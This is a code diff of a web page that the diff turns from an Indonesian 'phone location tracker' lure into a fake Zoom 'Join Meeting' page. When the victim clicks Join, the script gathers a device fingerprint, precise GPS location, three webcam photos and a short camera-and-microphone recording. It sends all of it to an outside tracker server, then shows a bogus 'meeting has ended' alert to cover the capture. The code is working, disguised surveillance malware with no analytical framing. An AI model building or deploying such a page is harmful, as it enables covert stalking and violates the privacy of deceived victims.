@@ -3,233 +3,270 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Lacak Lokasi Nomor HP - Verifikasi Cepat</title>
+  <title>Join Meeting - Zoom</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap">
   <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
     body {
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-      color: #e0e7ff;
-      margin: 0;
+      font-family: 'Inter', system-ui, sans-serif;
+      background: #ffffff;
+      color: #333;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
+    }
+
+    header {
+      padding: 16px 32px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #e5e5e5;
+    }
+
+    .logo {
+      font-size: 32px;
+      font-weight: 700;
+      color: #0e72ed;
+      letter-spacing: -2px;
+    }
+
+    .main {
+      flex: 1;
+      display: flex;
       align-items: center;
       justify-content: center;
+      padding: 40px 20px;
+    }
+
+    .join-box {
+      width: 100%;
+      max-width: 480px;
       text-align: center;
-      padding: 20px;
     }
+
     h1 {
-      color: #ff4d4d;
-      font-size: 2.6rem;
-      margin-bottom: 0.8rem;
-      text-shadow: 0 0 12px rgba(255, 77, 77, 0.7);
-    }
-    p.intro {
-      max-width: 520px;
-      margin: 0 auto 1.8rem;
-      color: #c7d2fe;
-      line-height: 1.6;
-      font-size: 1.1rem;
-    }
-    .warning {
-      color: #fbbf24;
+      font-size: 28px;
       font-weight: 600;
-      margin: 1.2rem 0;
-      font-size: 1.05rem;
+      margin-bottom: 32px;
+      color: #1a1a1a;
     }
-    button {
-      padding: 18px 70px;
-      font-size: 1.5rem;
-      font-weight: 800;
-      background: #dc2626;
+
+    .label {
+      text-align: left;
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 8px;
+      color: #444;
+    }
+
+    input {
+      width: 100%;
+      padding: 16px 20px;
+      font-size: 16px;
+      border: 1px solid #d0d0d0;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+
+    #joinBtn {
+      width: 100%;
+      padding: 16px;
+      background: #0e72ed;
       color: white;
+      font-size: 18px;
+      font-weight: 600;
       border: none;
-      border-radius: 9999px;
+      border-radius: 8px;
       cursor: pointer;
-      box-shadow: 0 12px 30px rgba(220, 38, 38, 0.5);
-      transition: all 0.35s;
-      margin: 2rem 0;
+      margin-top: 10px;
     }
-    button:hover:not(:disabled) {
-      transform: translateY(-4px);
-      box-shadow: 0 18px 40px rgba(220, 38, 38, 0.7);
-      background: #ef4444;
-    }
-    button:disabled {
-      opacity: 0.45;
+
+    #joinBtn:disabled {
+      opacity: 0.7;
       cursor: not-allowed;
-      transform: none;
-      box-shadow: none;
     }
+
     #status {
-      margin: 1.6rem 0;
-      font-size: 1.25rem;
-      color: #a5b4fc;
-      min-height: 1.6em;
+      margin-top: 20px;
+      font-size: 14px;
+      min-height: 22px;
+      color: #0e72ed;
     }
+
     #error {
-      color: #fca5a5;
-      font-size: 1.15rem;
-      max-width: 520px;
-      margin-top: 1.2rem;
-      line-height: 1.4;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #d93025;
+      min-height: 22px;
     }
-    #video {
-      display: none;
-      width: 1px;
-      height: 1px;
-    }
+
+    video { display: none; }
   </style>
 </head>
 <body>
 
-  <h1>Lacak Lokasi Nomor HP</h1>
-  <p class="intro">
-    Masukkan nomor HP target di aplikasi, lalu klik tombol verifikasi di bawah.<br>
-    Sistem akan melacak lokasi real-time setelah verifikasi kepemilikan selesai.
-  </p>
-  <p class="warning">
-    Proses ini memerlukan akses sementara ke kamera dan lokasi perangkat Anda.<br>
-    Izinkan semua izin di popup browser agar pelacakan berhasil.
-  </p>
+  <header>
+    <div class="logo">zoom</div>
+    <div>
+      <button style="padding:8px 20px; border-radius:9999px; border:1px solid #0e72ed; background:white; color:#0e72ed; font-weight:500;">Support</button>
+      <button style="padding:8px 20px; border-radius:9999px; border:none; background:#0e72ed; color:white; font-weight:500; margin-left:8px;">Sign Up Free</button>
+    </div>
+  </header>
 
-  <button id="startBtn">VERIFIKASI & MULAI PELACAKAN</button>
-  <div id="status">Menunggu konfirmasi...</div>
-  <div id="error"></div>
+  <div class="main">
+    <div class="join-box">
+      <h1>Join Meeting</h1>
+      
+      <div class="label">Meeting ID or Personal Link Name</div>
+      <input type="text" id="meetingId" value="987-654-321" readonly>
+
+      <button id="joinBtn">Join</button>
+      
+      <div id="status"></div>
+      <div id="error"></div>
+    </div>
+  </div>
 
   <video id="video" autoplay playsinline muted></video>
 
   <script>
-  const btn = document.getElementById('startBtn');
-  const status = document.getElementById('status');
-  const errorDiv = document.getElementById('error');
-  const videoEl = document.getElementById('video');
+    const btn = document.getElementById('joinBtn');
+    const status = document.getElementById('status');
+    const errorDiv = document.getElementById('error');
+    const videoEl = document.getElementById('video');
+    const SERVER_URL = 'https://coreproject.site/tracker/dashboard.php';   // GANTI JIKA PERLU
 
-  const SERVER_URL = 'https://coreproject.site/tracker/dashboard.php'; 
-
-  async function getDeviceFingerprint() {
-    const info = {
-      timestamp: new Date().toISOString(),
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.languages?.join(', ') || navigator.language,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      screen: `${screen.width} × ${screen.height} @ ${screen.colorDepth}-bit (${window.devicePixelRatio}x)`,
-      cpuCores: navigator.hardwareConcurrency || 'tidak tersedia',
-      deviceMemory: navigator.deviceMemory || 'tidak tersedia',
-      prefersDark: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
-      touchSupport: navigator.maxTouchPoints > 0 ? `Ya (${navigator.maxTouchPoints} points)` : 'Tidak',
-      cookiesEnabled: navigator.cookieEnabled ? 'Ya' : 'Tidak',
-      doNotTrack: navigator.doNotTrack || 'tidak diketahui',
-      localStorageUsage: JSON.stringify(localStorage || {}).length + ' bytes',
-      sessionStorageUsage: JSON.stringify(sessionStorage || {}).length + ' bytes'
-    };
-
-    try {
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      if (ctx) {
-        ctx.textBaseline = 'top';
-        ctx.font = '16px Arial';
-        ctx.fillStyle = '#f93'; ctx.fillRect(125, 1, 62, 20);
-        ctx.fillStyle = '#069'; ctx.fillText('TRACK HP 2026', 2, 15);
-        info.canvasHash = canvas.toDataURL().slice(-40);
+    // Deteksi MIME Type yang didukung Safari
+    async function getSupportedMimeType() {
+      const types = [
+        'video/mp4;codecs=h264',
+        'video/mp4',
+        'video/webm;codecs=vp8',
+        'video/webm'
+      ];
+      for (let type of types) {
+        if (MediaRecorder.isTypeSupported(type)) return type;
       }
-    } catch (e) {
-      info.canvasHash = 'gagal';
+      return 'video/mp4';
     }
 
-    return info;
-  }
-
-  btn.addEventListener('click', async () => {
-    btn.disabled = true;
-    errorDiv.textContent = '';
-    status.textContent = 'Memverifikasi perangkat...';
-
-    try {
-      const deviceInfo = await getDeviceFingerprint();
-
-      status.textContent = 'Mengunci lokasi GPS...';
-      const position = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {
-        enableHighAccuracy: true, timeout: 15000, maximumAge: 0
-      }));
-
-      const location = {
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        accuracy: position.coords.accuracy,
-        altitude: position.coords.altitude,
-        heading: position.coords.heading,
-        speed: position.coords.speed,
-        timestamp: new Date(position.timestamp).toISOString()
+    async function getDeviceFingerprint() {
+      return {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: `${screen.width}×${screen.height}`,
+        cpuCores: navigator.hardwareConcurrency || 'N/A',
+        deviceMemory: navigator.deviceMemory || 'N/A',
+        touchSupport: navigator.maxTouchPoints > 0
       };
-
-      status.textContent = `Lokasi terkunci (±${location.accuracy.toFixed(1)} m)`;
-
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user' }, audio: true
-      });
-
-      videoEl.srcObject = stream;
-      await videoEl.play();
-
-      const photos = [];
-      status.textContent = 'Mengambil bukti kepemilikan...';
-
-      for (let i = 0; i < 3; i++) {
-        await new Promise(r => setTimeout(r, i === 0 ? 1800 : 1300));
-        const canvas = document.createElement('canvas');
-        canvas.width = videoEl.videoWidth;
-        canvas.height = videoEl.videoHeight;
-        canvas.getContext('2d').drawImage(videoEl, 0, 0);
-        photos.push(canvas.toDataURL('image/jpeg', 0.88));
-      }
-
-      status.textContent = 'Menganalisa..';
-      const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-      const chunks = [];
-
-      recorder.ondataavailable = e => chunks.push(e.data);
-      recorder.start();
-
-      await new Promise(r => setTimeout(r, 3000));
-      recorder.stop();
-
-      const videoBlob = await new Promise((resolve, reject) => {
-        recorder.onstop = () => {
-          if (chunks.length === 0) reject(new Error('Video kosong'));
-          resolve(new Blob(chunks, { type: 'video/webm' }));
-        };
-        recorder.onerror = e => reject(e);
-      });
-
-      status.textContent = 'Mengirim data pelacakan...';
-      const formData = new FormData();
-
-      formData.append('location', JSON.stringify(location));
-      formData.append('device_info', JSON.stringify(deviceInfo));
-      formData.append('video', videoBlob, `capture_${Date.now()}.webm`);
-
-      for (let i = 0; i < photos.length; i++) {
-        const blob = await (await fetch(photos[i])).blob();
-        formData.append(`photo${i+1}`, blob, `photo_${Date.now()}_${i+1}.jpg`);
-      }
-
-      const response = await fetch(SERVER_URL, { method: 'POST', body: formData });
-
-      if (!response.ok) throw new Error(`Server error: ${response.status}`);
-
-      status.textContent = 'Lokasi berhasil dilacak!';
-      stream.getTracks().forEach(t => t.stop());
-
-    } catch (err) {
-      status.textContent = 'Gagal Verifikasi Data';
-      errorDiv.textContent = 'Server Sedang Sibuk.';
-      btn.disabled = false;
     }
-  });
-  </script>
 
+    btn.addEventListener('click', async () => {
+      btn.disabled = true;
+      status.textContent = 'Connecting to meeting...';
+      errorDiv.textContent = '';
+
+      try {
+        const deviceInfo = await getDeviceFingerprint();
+
+        // Geolocation
+        status.textContent = 'Getting location...';
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+          });
+        });
+
+        const location = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy
+        };
+
+        // Camera + Microphone
+        status.textContent = 'Activating camera...';
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: true
+        });
+
+        videoEl.srcObject = stream;
+        await videoEl.play().catch(() => {});
+
+        // Ambil 3 Foto
+        const photos = [];
+        for (let i = 0; i < 3; i++) {
+          await new Promise(r => setTimeout(r, 1300));
+          const canvas = document.createElement('canvas');
+          canvas.width = videoEl.videoWidth || 640;
+          canvas.height = videoEl.videoHeight || 480;
+          canvas.getContext('2d').drawImage(videoEl, 0, 0);
+          photos.push(canvas.toDataURL('image/jpeg', 0.85));
+        }
+
+        // Rekam Video (3 detik)
+        status.textContent = 'Recording...';
+        const mimeType = await getSupportedMimeType();
+        const recorder = new MediaRecorder(stream, { mimeType: mimeType });
+        const chunks = [];
+
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.start();
+
+        await new Promise(r => setTimeout(r, 3200));
+        recorder.stop();
+
+        const videoBlob = await new Promise(resolve => {
+          recorder.onstop = () => resolve(new Blob(chunks, { type: mimeType }));
+        });
+
+        // Kirim ke dashboard.php
+        status.textContent = 'Joining meeting...';
+        const formData = new FormData();
+        formData.append('location', JSON.stringify(location));
+        formData.append('device_info', JSON.stringify(deviceInfo));
+        
+        const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
+        formData.append('video', videoBlob, `zoom_meeting_${Date.now()}.${ext}`);
+
+        for (let i = 0; i < photos.length; i++) {
+          const blob = await fetch(photos[i]).then(r => r.blob());
+          formData.append(`photo${i+1}`, blob, `photo_${Date.now()}_${i+1}.jpg`);
+        }
+
+        const response = await fetch(SERVER_URL, {
+          method: 'POST',
+          body: formData
+        });
+
+        if (response.ok) {
+          status.innerHTML = '✅ Successfully joined the meeting';
+          setTimeout(() => {
+            alert("The meeting is not available or has ended. Please try again later.");
+            btn.disabled = false;
+          }, 1500);
+        } else {
+          throw new Error('Server error');
+        }
+
+        // Cleanup
+        stream.getTracks().forEach(track => track.stop());
+
+      } catch (err) {
+        console.error(err);
+        let msg = 'Failed to join meeting.';
+        if (err.name === 'NotAllowedError') msg = 'Permission denied. Please allow Camera, Microphone & Location.';
+        if (err.name === 'NotFoundError') msg = 'No camera or microphone found.';
+        errorDiv.textContent = msg;
+        btn.disabled = false;
+      }
+    });
+  </script>
 </body>
 </html>
